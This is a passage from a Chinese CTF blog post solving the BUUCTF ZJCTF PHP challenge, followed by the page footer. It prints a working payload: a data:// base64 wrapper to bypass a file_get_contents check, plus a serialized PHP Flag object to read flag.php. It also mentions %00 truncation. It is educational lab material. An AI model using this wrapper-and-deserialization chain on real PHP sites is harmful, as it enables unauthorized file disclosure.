&quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$password = new Flag();</span><br><span class="line">echo serialize($password);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>所以payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>到这里整理下思路：</p>
+<ul>
+<li>首先，利用data伪协议，text参数便可以绕过<code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code>，顺利进入判断语句内</li>
+<li>然后，包含了<code>useless.php</code>文件，从而在原代码中引入了<code>Flag</code>对象，只有如此，在<code>password</code>参数反序列化才可输出<code>flag.php</code>文件的内容</li>
+<li>传入的<code>password</code>参数经过反序列化后，得到一个<code>$file=flag.php</code>的Flag对象，同时执行了该Flag对象内部的<code>__tostring()</code>方法，输出<code>flag.php</code>的内容，从而得到<code>flag</code><br>注意：需要查看网页源代码方可见到<code>flag</code><br>文件包含是否支持%00截断取决于：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP版本&lt;=5.2 可以使用%00进行截断。</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html">CTF中常用的php伪协议利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dubhe-/p/9997842.html">浅析PHP伪协议在CTF的应用</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0a8339fcc269">PHP伪协议在CTF中的应用</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/04/01/buu/buu%E5%81%9A%E9%A2%98%E6%97%A5%E5%BF%97%20web1/" rel="prev" title="Buu做题日志 web1">
+                  <i class="fa fa-chevron-left"></i> Buu做题日志 web1
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/04/03/PHP/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/" rel="next" title="文件上传（总结和缝合）">
+                  文件上传（总结和缝合） <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D0gekong</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
